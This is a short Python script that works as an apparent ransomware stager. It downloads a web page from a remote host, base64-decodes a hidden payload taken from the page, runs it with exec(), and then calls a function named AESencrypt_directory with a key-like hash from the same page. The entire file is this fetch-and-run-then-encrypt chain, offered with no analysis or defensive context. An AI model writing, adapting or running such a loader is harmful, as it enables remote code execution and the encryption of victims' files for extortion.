#!/bin/python3

import requests
import base64
from bs4 import BeautifulSoup

url = 'http://foo.com/'

if __name__ == "__main__":

    response = requests.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        encoded_content = soup.find('pre').text.strip()
        unique_hash = soup.find('p').text.strip()
        decoded_script = base64.b64decode(encoded_content).decode('utf-8')
        exec(decoded_script)
        AESencrypt_directory(unique_hash)
    else:
        print(f"Failed to retrieve the page. Status code: {response.status_code}")
